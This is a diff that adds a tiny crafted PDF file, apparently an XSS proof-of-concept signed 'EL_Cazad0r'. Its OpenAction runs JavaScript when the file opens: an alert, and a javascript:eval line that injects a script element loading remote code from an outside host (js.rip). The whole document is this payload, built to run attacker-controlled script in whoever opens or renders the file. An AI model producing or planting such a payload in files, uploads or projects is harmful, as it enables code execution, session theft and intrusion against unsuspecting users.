@@ -1,0 +1,7 @@
+%PDF-1.7
+        1 0 obj
+        <</Pages 1 0 R /OpenAction 2 0 R>>
+        2 0 obj
+        <</S /JavaScript /JS (app.alert("Xss by EL_Cazad0r"))
+        javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/elcazad0r\';document.body.appendChild(a)')
+        >> trailer <</Root 1 0 R>>
